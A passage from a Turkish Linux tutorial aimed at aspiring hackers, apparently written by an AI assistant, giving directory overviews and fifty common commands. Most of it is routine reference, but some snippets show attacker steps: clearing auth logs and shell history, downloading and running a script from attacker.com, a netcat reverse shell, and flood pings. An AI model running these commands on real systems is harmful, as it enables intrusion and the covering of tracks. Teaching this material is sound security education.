root:$6$abcd1234$hashedpassword...:18900:0:99999:7:::
user:$6$efgh5678$anotherhashedpass...:18901:0:99999:7:::

# Format:
# username:$algorithm$salt$hash:...
#           ↑
#        $6 = SHA-512
```

**2. /var/log: Log Dosyaları (İzleri Sil!)**

```bash
# Kimler login olmuş?
cat /var/log/auth.log

# Web sunucu log'ları
cat /var/log/apache2/access.log

# Sistem mesajları
cat /var/log/syslog

# Hacker'ın yapacağı (izleri silmek):
echo "" > /var/log/auth.log  # Log'u temizle (SADECEroot)
```

**3. /tmp: Geçici Dosyalar (Herkese Yazılabilir)**

```bash
# Herkes yazabilir, exploit upload için ideal
cd /tmp
wget http://attacker.com/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

**4. /proc: Kernel ve Process Bilgileri**

```bash
# CPU bilgisi:
cat /proc/cpuinfo

# RAM bilgisi:
cat /proc/meminfo

# Network ayarları:
cat /proc/net/tcp

# Çalışan process'ler:
ls /proc/  # Her sayı bir process ID (PID)
```

---

## 2.3 En Kritik 50 Linux Komutu
<a name="23-50-komut"></a>

### Kategori 1: Dosya İşlemleri (10 Komut)

**1. ls - List (Dosyaları Listele)**

```bash
# Basit listeleme:
ls

# Detaylı listeleme (izinler, boyut, tarih):
ls -l

# Gizli dosyaları da göster:
ls -a

# İnsan okunabilir boyutlar:
ls -lh

# En son değişenler en üstte:
ls -lt

# Kombinasyon:
ls -lah
```

**2. cd - Change Directory (Dizin Değiştir)**

```bash
# Belirli dizine git:
cd /var/www

# Bir üst dizine çık:
cd ..

# Home dizinine git:
cd ~
cd

# Önceki dizine geri dön:
cd -
```

**3. pwd - Print Working Directory (Şu Anki Dizin)**

```bash
pwd
# Çıktı: /home/user/Documents
```

**4. mkdir - Make Directory (Dizin Oluştur)**

```bash
# Tek dizin:
mkdir test

# İç içe dizinler:
mkdir -p parent/child/grandchild

# İzinlerle oluştur:
mkdir -m 755 public_folder
```

**5. rm - Remove (Sil)**

```bash
# Dosya sil:
rm file.txt

# Dizin sil (recursive):
rm -r folder/

# Zorla sil (onay sorma):
rm -f file.txt

# Kombinasyon (DİKKAT! Geri alınamaz):
rm -rf /path/to/directory

# ASLA YAPMA:
rm -rf /  # Tüm sistemi siler!
```

**6. cp - Copy (Kopyala)**

```bash
# Dosya kopyala:
cp source.txt destination.txt

# Dizin kopyala (recursive):
cp -r folder/ backup/

# İzinleri koru:
cp -p file.txt backup/
```

**7. mv - Move (Taşı/Yeniden Adlandır)**

```bash
# Dosyayı taşı:
mv file.txt /tmp/

# Yeniden adlandır:
mv oldname.txt newname.txt

# Birden fazla dosyayı dizine taşı:
mv file1.txt file2.txt /destination/
```

**8. cat - Concatenate (Dosya İçeriğini Göster)**

```bash
# Dosyayı oku:
cat file.txt

# Birden fazla dosyayı birleştir:
cat file1.txt file2.txt > combined.txt

# Satır numaraları ile:
cat -n file.txt
```

**9. touch - Dosya Oluştur/Zaman Damgasını Güncelle**

```bash
# Boş dosya oluştur:
touch newfile.txt

# Zaman damgasını güncelle:
touch existingfile.txt
```

**10. find - Dosya Ara**

```bash
# İsimle ara:
find /path -name "*.txt"

# Boyuta göre ara (100MB'dan büyük):
find /path -size +100M

# İzne göre ara (SUID bitli dosyalar - privilege escalation):
find / -perm -4000 2>/dev/null

# Son 7 günde değişenler:
find /path -mtime -7
```

### Kategori 2: Metin İşleme (10 Komut)

**11. grep - Text Ara**

```bash
# Dosyada kelime ara:
grep "password" file.txt

# Case-insensitive:
grep -i "password" file.txt

# Recursive (dizindeki tüm dosyalarda):
grep -r "password" /var/www/

# Satır numarası ile:
grep -n "error" log.txt

# Eşleşmeyen satırları göster:
grep -v "success" log.txt

# Regex kullan:
grep -E "192\.168\.[0-9]+\.[0-9]+" file.txt
```

**12. sed - Stream Editor (Metin Düzenle)**

```bash
# Kelime değiştir:
sed 's/old/new/' file.txt

# Tüm eşleşmeleri değiştir (global):
sed 's/old/new/g' file.txt

# Dosyayı değiştir (in-place):
sed -i 's/old/new/g' file.txt

# Belirli satırı sil:
sed '5d' file.txt  # 5. satırı sil

# Satır aralığını sil:
sed '10,20d' file.txt  # 10-20 arası satırları sil
```

**13. awk - Text Processing**

```bash
# Sütunları yazdır:
awk '{print $1, $3}' file.txt  # 1. ve 3. sütun

# /etc/passwd'dan kullanıcı adları:
awk -F: '{print $1}' /etc/passwd

# Koşullu yazdırma:
awk '$3 > 100 {print $0}' file.txt  # 3. sütun >100 olanlar

# Toplamını hesapla:
awk '{sum += $1} END {print sum}' numbers.txt
```

**14. cut - Sütunları Kes**

```bash
# Belirli sütunları al (boşluk ayırıcı):
cut -d ' ' -f 1,3 file.txt

# Karakter aralığı:
cut -c 1-10 file.txt  # İlk 10 karakter

# CSV dosyasından sütun:
cut -d ',' -f 2 data.csv
```

**15. sort - Sırala**

```bash
# Alfabetik sırala:
sort file.txt

# Ters sırala:
sort -r file.txt

# Sayısal sırala:
sort -n numbers.txt

# Benzersiz satırlar:
sort -u file.txt
```

**16. uniq - Tekrar Eden Satırları Kaldır**

```bash
# Tekrarları sil:
sort file.txt | uniq

# Tekrar sayısını göster:
sort file.txt | uniq -c

# Sadece tekrar edenleri göster:
sort file.txt | uniq -d
```

**17. wc - Word Count (Satır/Kelime/Karakter Say)**

```bash
# Satır sayısı:
wc -l file.txt

# Kelime sayısı:
wc -w file.txt

# Karakter sayısı:
wc -c file.txt

# Hepsi:
wc file.txt
```

**18. head - İlk Satırları Göster**

```bash
# İlk 10 satır (varsayılan):
head file.txt

# İlk 20 satır:
head -n 20 file.txt

# İlk 100 byte:
head -c 100 file.txt
```

**19. tail - Son Satırları Göster**

```bash
# Son 10 satır:
tail file.txt

# Son 50 satır:
tail -n 50 file.txt

# Canlı izle (log dosyaları için):
tail -f /var/log/syslog
```

**20. tr - Translate (Karakter Değiştir)**

```bash
# Küçük harfe çevir:
echo "HELLO" | tr '[:upper:]' '[:lower:]'

# Boşlukları sil:
echo "hello world" | tr -d ' '

# Satır sonu karakterlerini değiştir:
tr '\n' ',' < file.txt
```

### Kategori 3: Network (10 Komut)

**21. ping - Network Bağlantısını Test Et**

```bash
# Basit ping:
ping google.com

# 5 paket gönder:
ping -c 5 192.168.1.1

# Flood ping (DDoS testi - sadece root):
ping -f 192.168.1.1
```

**22. ifconfig / ip - Network Ayarlarını Gör**

```bash
# Tüm interface'leri göster (eski):
ifconfig

# Yeni komut:
ip addr show

# Belirli bir interface:
ip addr show eth0

# IP adresi ekle:
sudo ip addr add 192.168.1.100/24 dev eth0
```

**23. netstat - Network İstatistikleri**

```bash
# Açık portları göster:
netstat -tuln

# -t: TCP
# -u: UDP
# -l: Listening (dinleyen)
# -n: Numeric (IP olarak göster)

# Bağlantıları ve process'leri göster:
netstat -tulnp

# Routing tablosu:
netstat -r
```

**24. ss - Socket Statistics (netstat'ın modern hali)**

```bash
# Dinleyen TCP portları:
ss -tuln

# Process bilgisi ile:
ss -tulnp

# Established bağlantılar:
ss -t state established
```

**25. curl - URL'den Veri Çek**

```bash
# GET request:
curl https://example.com

# POST request:
curl -X POST -d "user=admin&pass=123" https://example.com/login

# Header ekle:
curl -H "Authorization: Bearer token123" https://api.example.com

# Dosyaya kaydet:
curl -o output.html https://example.com

# Cookie kullan:
curl -b "session=abc123" https://example.com
```

**26. wget - Dosya İndir**

```bash
# Dosya indir:
wget https://example.com/file.zip

# Devam ettir (yarım kalan):
wget -c https://example.com/largefile.iso

# Recursive (tüm web sitesini indir):
wget -r https://example.com

# Background'da çalıştır:
wget -b https://example.com/file.zip
```

**27. ssh - Secure Shell (Uzak Bağlantı)**

```bash
# Basit bağlantı:
ssh user@192.168.1.100

# Port belirt:
ssh -p 2222 user@192.168.1.100

# Key ile bağlan:
ssh -i ~/.ssh/id_rsa user@192.168.1.100

# Komut çalıştır ve çık:
ssh user@192.168.1.100 "ls -la"

# Local port forwarding (tunnel):
ssh -L 8080:localhost:80 user@192.168.1.100
```

**28. scp - Secure Copy (Dosya Kopyala)**

```bash
# Local'den remote'a:
scp file.txt user@192.168.1.100:/home/user/

# Remote'tan local'e:
scp user@192.168.1.100:/home/user/file.txt ./

# Dizin kopyala:
scp -r folder/ user@192.168.1.100:/home/user/

# Port belirt:
scp -P 2222 file.txt user@192.168.1.100:/home/user/
```

**29. nc (netcat) - Network İsviçre Çakısı**

```bash
# Port dinle (listener):
nc -l -p 4444

# Bağlan:
nc 192.168.1.100 4444

# Port tarama:
nc -zv 192.168.1.100 20-80

# Reverse shell (SALDIRI):
# Saldırgan:
nc -l -p 4444

# Kurban:
nc 192.168.1.50 4444 -e /bin/bash  # Shell verir!

# Banner grabbing:
nc 192.168.1.100 80
GET / HTTP/1.0  # Enter'a iki kez bas
```

**30. tcpdump - Paket Yakala (CLI Wireshark)**

```bash
# Tüm trafiği yakala:
sudo tcpdump

# Belirli interface:
sudo tcpdump -i eth0

# Port 80 trafiği:
sudo tcpdump -i eth0 port 80

# Dosyaya kaydet:
sudo tcpdump -i eth0 -w capture.pcap

# Dosyadan oku:
sudo tcpdump -r capture.pcap

# Detaylı paket içeriği:
sudo tcpdump -i eth0 -X
```

### Kategori 4: Sistem Yönetimi (10 Komut)

**31. ps - Process Listesi**

```bash
# Tüm process'ler:
ps aux

# a: Tüm kullanıcılar
# u: User-oriented format
# x: Terminal olmayan process'ler de

# Belirli bir process:
ps aux | grep apache

# Tree formatında:
ps auxf
```

**32. top - Canlı Process İzleme**

```bash
# İnteraktif process izleme:
top

# Kısayollar:
# q: Çık
# k: Process öldür (PID sor)
# M: Memory'e göre sırala
# P: CPU'ya göre sırala
# 1: Tüm CPU çekirdeklerini göster
```

**33. htop - İyileştirilmiş top (Kurulum Gerekir)**

```bash
# Daha güzel arayüz:
htop

# Faydaları:
# - Renkli
# - Mouse ile seçim
# - Tree view
# - Kolay kill
```

**34. kill - Process Öldür**

```bash
# Normal sonlandır (SIGTERM):
kill 1234  # PID 1234'ü öldür

# Zorla öldür (SIGKILL):
kill -9 1234

# İsimle öldür:
killall apache2

# Pattern ile öldür:
pkill -f "python.*server"
```

**35. df - Disk Kullanımı**

```bash
# Tüm disk'leri göster:
df -h

# -h: Human readable (GB, MB)

# Belirli bir dizin:
df -h /home

# İnode kullanımı:
df -i
```

**36. du - Dizin Boyutu**

```bash
# Dizin boyutu:
du -sh /var/www

# -s: Summary (toplam)
# -h: Human readable

# Alt dizinleri de göster:
du -h --max-depth=1 /var

# En büyük 10 dosya/dizin:
du -ah /var | sort -rh | head -10
```

**37. free - RAM Kullanımı**

```bash
# Memory bilgisi:
free -h

# Çıktı:
              total        used        free      shared  buff/cache   available
Mem:           7.7G        2.3G        3.1G        123M        2.3G        5.1G
Swap:          2.0G          0B        2.0G
```

**38. uptime - Sistem Ne Kadar Süredir Açık**

```bash
uptime

# Çıktı:
 10:23:45 up 15 days,  3:42,  2 users,  load average: 0.52, 0.58, 0.59
#          ↑ Açık kalma süresi           ↑ Load average (1, 5, 15 dk)
```

**39. uname - Sistem Bilgisi**

```bash
# İşletim sistemi:
uname -a

# Çıktı:
Linux kali 5.10.0-kali7-amd64 #1 SMP Debian 5.10.28-1kali1 (2021-04-12) x86_64 GNU/Linux

# Sadece kernel versiyonu:
uname -r
```

**40. chmod - Dosya İzinlerini Değiştir**

```bash
# Sayısal mod:
chmod 755 script.sh  # rwxr-xr-x
chmod 644 file.txt   # rw-r--r--
chmod 777 file.txt   # rwxrwxrwx (TEHLİKELİ!)

# Sembolik mod:
chmod +x script.sh   # Execute ekle
chmod -w file.txt    # Write kaldır
chmod u+x file.sh    # User'a execute ekle

# Recursive:
chmod -R 755 /var/www
```

### Kategori 5: Paket Yönetimi & Diğer (10 Komut)

**41. apt / apt-get - Paket Yöneticisi (Debian/Ubuntu)**

```bash
# Paket listesini güncelle:
sudo apt update

# Paketleri yükselt:
sudo apt upgrade

# Paket kur:
sudo apt install nmap

# Paket kaldır:
sudo apt remove nmap

# Paket ara:
apt search wireless
```

**42. dpkg - Debian Paket Yöneticisi (Düşük Seviye)**

```bash
# .deb dosyası kur:
sudo dpkg -i package.deb

# Kurulu paketleri listele:
dpkg -l

# Paketin dosyalarını göster:
dpkg -L nmap
```

**43. systemctl - Servis Yönetimi**

```bash
# Servis başlat:
sudo systemctl start apache2

# Servis durdur:
sudo systemctl stop apache2

# Servis yeniden başlat:
sudo systemctl restart apache2

# Durumu kontrol et:
sudo systemctl status apache2

# Boot'ta otomatik başlat:
sudo systemctl enable apache2

# Otomatik başlatmayı kapat:
sudo systemctl disable apache2
```

**44. cron / crontab - Zamanlanmış Görevler**

```bash
# Crontab'ı düzenle:
crontab -e

# Format:
# * * * * * /path/to/command
# │ │ │ │ │
# │ │ │ │ └─ Haftanın günü (0-7, 0=Pazar)
# │ │ │ └─── Ay (1-12)
# │ │ └───── Ayın günü (1-31)
# │ └─────── Saat (0-23)
# └───────── Dakika (0-59)

# Örnekler:
0 2 * * * /backup.sh         # Her gün 02:00'de
*/5 * * * * /check.sh        # Her 5 dakikada
0 0 * * 0 /weekly.sh         # Her pazar 00:00'da
```

**45. tar - Arşivleme**

```bash
# Sıkıştır:
tar -czvf archive.tar.gz /path/to/directory

# -c: Create
# -z: Gzip
# -v: Verbose (ayrıntılı)
# -f: File

# Aç:
tar -xzvf archive.tar.gz

# -x: Extract

# Sadece listele:
tar -tzvf archive.tar.gz
```

**46. gzip / gunzip - Sıkıştırma**

```bash
# Sıkıştır:
gzip file.txt  # file.txt.gz oluşur

# Aç:
gunzip file.txt.gz

# Sıkıştırma seviyesi (1-9):
gzip -9 file.txt  # Maksimum sıkıştırma
```

**47. history - Komut Geçmişi**

```bash
# Geçmişi göster:
history

# Son 20 komut:
history 20

# Geçmişi temizle (İzleri sil!):
history -c

# Geçmişi dosyaya kaydet:
history > commands.txt

# Belirli bir komutu tekrar çalıştır:
!123  # 123. komutu çalıştır
!!    # Son komutu tekrar çalıştır
```

**48. alias - Komut Kısayolu**

```bash
# Kısayol oluştur:
alias ll='ls -lah'
alias update='sudo apt update && sudo apt upgrade'
alias scan='nmap -sS -sV'

# Kalıcı yapmak için ~/.bashrc'ye ekle:
echo "alias ll='ls -lah'" >> ~/.bashrc
source ~/.bashrc
```

**49. which / whereis - Komutun Yerini Bul**

```bash
# Komutun executable'ının yolu:
which python3
# /usr/bin/python3

# Komutun tüm dosyalarını bul:
whereis nmap
# nmap: /usr/bin/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz
```

**50. man - Manual (Yardım)**

```bash
# Komutun manualini oku:
man ls
man grep
man nmap

# Kısa açıklama:
whatis ls

# Örneklerle:
man -k keyword  # Keyword içeren manualleri ara
```

---

*[Dosya çok uzun olduğu için burada kısaltıldı. Devam edecek...]*

## İLERİ BÖLÜMLER (Devam Edecek):

- BÖLÜM 3: SQL & INJECTION
- BÖLÜM 4: WEB GÜVENLİĞİ
- BÖLÜM 5: PHP GÜVENLİĞİ
- BÖLÜM 6: ZAFİYET BULMA
- BÖLÜM 7: ARAÇLAR
- BÖLÜM 8: HACKER ZİHNİYETİ

**Şimdi dosyayı sunuyorum. Devam etmemi ister misin?**
